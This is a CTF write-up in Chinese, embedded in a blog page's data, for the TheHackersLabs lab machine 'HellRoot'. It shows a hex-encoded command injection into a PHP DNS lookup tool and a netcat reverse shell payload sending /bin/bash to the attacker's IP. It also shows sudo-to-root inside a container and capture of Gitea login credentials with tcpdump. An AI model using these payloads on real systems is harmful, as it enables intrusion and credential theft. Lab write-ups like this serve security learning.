<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/e3722a685bf8da82.css" as="style"/><link rel="stylesheet" href="/_next/static/css/e3722a685bf8da82.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-c63903712a141bbb.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-bb6c42847cbf8692.js" defer=""></script><script src="/_next/static/rBOAoH_mNY0kmuqb3_RcF/_buildManifest.js" defer=""></script><script src="/_next/static/rBOAoH_mNY0kmuqb3_RcF/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"TheHackersLabsHellRoot","contentHtml":"\u003ch1\u003eHellRoot\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://labs.thehackerslabs.com/machine/121\"\u003ehttps://labs.thehackerslabs.com/machine/121\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  HellRoot nmap -sT -min-rate 10000 -p- 192.168.56.95\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:08 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.95\nHost is up (0.00052s latency).\nNot shown: 65530 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n222/tcp  open  rsh-spx\n443/tcp  open  https\n5000/tcp open  upnp\nMAC Address: 08:00:27:5E:A1:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 3.73 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  HellRoot nmap -sT -A -p 22,80,222,443,5000 192.168.56.95\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:09 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.95\nHost is up (0.00076s latency).\n\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey:\n|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)\n|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)\n80/tcp   open  http     Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Apache2 Debian Default Page: It works\n222/tcp  open  ssh      OpenSSH 10.0 (protocol 2.0)\n443/tcp  open  ssl/http nginx 1.29.0\n| ssl-cert: Subject: commonName=git.hellroot.thl\n| Not valid before: 2025-07-17T18:18:57\n|_Not valid after:  2026-07-17T18:18:57\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: TLS randomness does not represent \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e\n| tls-alpn:\n|   http/1.1\n|   http/1.0\n|_  http/0.9\n|_http-server-header: nginx/1.29.0\n|_http-title: Did not follow redirect to https://git.hellroot.thl/\n5000/tcp open  http     Apache httpd\n|_http-server-header: Apache\n|_http-title: Domain Lookup Service\nMAC Address: 08:00:27:5E:A1:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.76 ms 192.168.56.95\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫描出来有两个 \u003ccode\u003eSSH\u003c/code\u003e 服务，三个 \u003ccode\u003eWeb\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e192.168.56.5\u003c/code\u003e 是 \u003ccode\u003eApache\u003c/code\u003e 的默认页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttps://git.hellroot.thl/\u003c/code\u003e 是 \u003ccode\u003eGitea\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttp://git.hellroot.thl:5000/\u003c/code\u003e 是域名解析一样的东西\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试了一下这个功能，貌似是使用 \u003ccode\u003edig\u003c/code\u003e 来做域名解析，不过我这里使用仅主机所以无法进行解析\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里我也尝试了命令拼接，经过简单尝试没有哪里可以进行注入\u003c/p\u003e\n\u003cp\u003e来到 \u003ccode\u003egitea\u003c/code\u003e 能找到一个项目\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将压缩包下载下来打开，是 \u003ccode\u003e5000\u003c/code\u003e 端口的源码\u003c/p\u003e\n\u003cp\u003e有三个文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003eDockerfile\u003c/code\u003e 里面能发现一个用户密码，但是这里使用 \u003ccode\u003eSSH\u003c/code\u003e 无法进行登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# Create user astro with passwordless sudo access only for /bin/su\u003c/span\u003e\nRUN useradd -m astro \u0026#x26;\u0026#x26; \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"astro:iloveastro\"\u003c/span\u003e | chpasswd \u0026#x26;\u0026#x26; \\\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"astro ALL=(ALL:ALL) NOPASSWD: /bin/su\"\u003c/span\u003e \u003e /etc/sudoers.d/astro-su \u0026#x26;\u0026#x26; \\\n    \u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e 440 /etc/sudoers.d/astro-su\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e并且 \u003ccode\u003e222\u003c/code\u003e 端口只能使用私钥进行登录\u003c/p\u003e\n\u003ch2\u003eRCE 漏洞\u003c/h2\u003e\n\u003cp\u003e下边是\u003ccode\u003eindex.php\u003c/code\u003e 的源码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;main\u003e\n  \u0026#x3C;h1\u003eDomain Lookup Service\u0026#x3C;/h1\u003e\n  \u0026#x3C;form method=\u003cspan class=\"hljs-string\"\u003e\"POST\"\u003c/span\u003e action=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003e\n    \u0026#x3C;label \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"domain\"\u003c/span\u003e\u003eEnter Domain\u0026#x3C;/label\u003e\n    \u0026#x3C;input \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"domain\"\u003c/span\u003e name=\u003cspan class=\"hljs-string\"\u003e\"domain\"\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text\"\u003c/span\u003e placeholder=\u003cspan class=\"hljs-string\"\u003e\"example.com\"\u003c/span\u003e required autocomplete=\u003cspan class=\"hljs-string\"\u003e\"off\"\u003c/span\u003e /\u003e\n    \u0026#x3C;button \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"submit\"\u003c/span\u003e\u003eLookup DNS\u0026#x3C;/button\u003e\n  \u0026#x3C;/form\u003e\n\n\u0026#x3C;?php\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$_SERVER\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'REQUEST_METHOD'\u003c/span\u003e] === \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e \u0026#x26;\u0026#x26; !empty(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'domain'\u003c/span\u003e])) {\n    \u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e = trim(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'domain'\u003c/span\u003e]);\n    \u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e = @hex2bin(\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e);\n\n    // Always show raw output \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e debugging\n    ob_start();\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e \u0026#x26;\u0026#x26; ctype_print(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e)) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (strpos(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e';'\u003c/span\u003e) !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {\n            // Remove header modification that breaks execution\n            \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e' 2\u003e\u0026#x26;1'\u003c/span\u003e);\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e = escapeshellarg(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e);\n            \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-string\"\u003e\"nslookup \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e 2\u003e\u0026#x26;1\"\u003c/span\u003e);\n        }\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e = escapeshellarg(\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e);\n        \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-string\"\u003e\"nslookup \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e 2\u003e\u0026#x26;1\"\u003c/span\u003e);\n    }\n\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'\u0026#x3C;pre class=\"result\"\u003e'\u003c/span\u003e . htmlspecialchars(\u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e ?: \u003cspan class=\"hljs-string\"\u003e'No output returned.'\u003c/span\u003e) . \u003cspan class=\"hljs-string\"\u003e'\u0026#x3C;/pre\u003e'\u003c/span\u003e;\n    ob_end_flush();\n}\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e很明显存在一个\u003ccode\u003eRCE\u003c/code\u003e 漏洞\u003c/p\u003e\n\u003cp\u003e这里接收我们的参数 \u003ccode\u003edomain\u003c/code\u003e ，然后对其进行\u003ccode\u003e16\u003c/code\u003e进制编码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e = trim(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'domain'\u003c/span\u003e]);\n\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e = @hex2bin(\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后下边判断解码是否成功，和是否为可以打印字符\u003c/p\u003e\n\u003cp\u003e假如我们直接输入字符则进入 \u003ccode\u003eelse\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e   \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e \u0026#x26;\u0026#x26; ctype_print(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e)) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (strpos(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e';'\u003c/span\u003e) !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {\n            // Remove header modification that breaks execution\n            \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e' 2\u003e\u0026#x26;1'\u003c/span\u003e);\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e = escapeshellarg(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e);\n            \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-string\"\u003e\"nslookup \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e 2\u003e\u0026#x26;1\"\u003c/span\u003e);\n        }\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n\t\t    // 字符直接进入这里\n        \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e = escapeshellarg(\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e);\n        \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-string\"\u003e\"nslookup \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e 2\u003e\u0026#x26;1\"\u003c/span\u003e);\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e假如我们输入\u003ccode\u003e16\u003c/code\u003e进制，并且解码成功就会进入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (strpos(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e';'\u003c/span\u003e) !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {\n            // Remove header modification that breaks execution\n            \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e' 2\u003e\u0026#x26;1'\u003c/span\u003e);\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e = escapeshellarg(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e);\n            \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = shell_exec(\u003cspan class=\"hljs-string\"\u003e\"nslookup \u003cspan class=\"hljs-variable\"\u003e$safeDomain\u003c/span\u003e 2\u003e\u0026#x26;1\"\u003c/span\u003e);\n        }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e$output = shell_exec($decoded . ' 2\u003e\u0026#x26;1');\u003c/code\u003e ，如果找到了分号，代码会直接将解码后的、未经任何处理的字符串 \u003ccode\u003e$decoded\u003c/code\u003e 传递给 \u003ccode\u003eshell_exec\u003c/code\u003e 函数执行\u003c/p\u003e\n\u003cp\u003e我们尝试 \u003ccode\u003egoogle.com;nc 192.168.56.5 80\u003c/code\u003e ，然后转换为 \u003ccode\u003e16\u003c/code\u003e 进制\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e参数填入 \u003ccode\u003edomian\u003c/code\u003e 参数后成功执行\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003egoogle.com;nc 192.168.56.5 1234 -e /bin/bash\n// To hex\n676f6f676c652e636f6d3b6e63203139322e3136382e35362e352031323334202d65202f62696e2f62617368\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e网络嗅探\u003c/h2\u003e\n\u003cp\u003e当前我们在 \u003ccode\u003eDocker\u003c/code\u003e 环境里面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@05cc10128c04:/home$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -la /\ntotal 64\ndrwxr-xr-x   1 root root 4096 Jul 19 12:49 .\ndrwxr-xr-x   1 root root 4096 Jul 19 12:49 ..\n-rwxr-xr-x   1 root root    0 Jul 19 12:49 .dockerenv\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e找到一个文本文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@05cc10128c04:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e sniff.txt \nPuede que haya ciertas herramientas que te permitan esnifar el trafico.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e可能存在某些工具可以让你嗅探流量。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e隐藏的 \u003ccode\u003e.config\u003c/code\u003e 文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@05cc10128c04:/var/www/html/.config$\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e里面有 \u003ccode\u003edpkg\u003c/code\u003e 的信息，能看到有 \u003ccode\u003etcpdump\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用上面的得到的凭据切换用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@05cc10128c04:/home$ su astro \nPassword: \n$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1001(astro) gid=1001(astro) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1001(astro)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再根据 \u003ccode\u003esudo -l\u003c/code\u003e 的权限，可以直接切换到 \u003ccode\u003eroot\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e astro on 05cc10128c04:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser astro may run the following commands on 05cc10128c04:\n    (ALL : ALL) NOPASSWD: /bin/su\n$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e su root\nroot@05cc10128c04:/home# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们再根据上边的文件进行网络嗅探\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是直接抓并不能抓到什么有用的，想起来 \u003ccode\u003eGitea\u003c/code\u003e 可以进行登录\u003c/p\u003e\n\u003cp\u003e先提前开启抓包，然后在网站上个使用凭据登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003etcpdump -i eth0 -A -w 1.pcap\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后直接查看数据包，能得到一个凭据\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但一开始并没想到这个是密码，因为我认为这是前端传过来加密数据\u003c/p\u003e\n\u003cp\u003e然后在 \u003ccode\u003essh\u003c/code\u003e 进行密码碰撞，成功登录进去了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image14.png\" 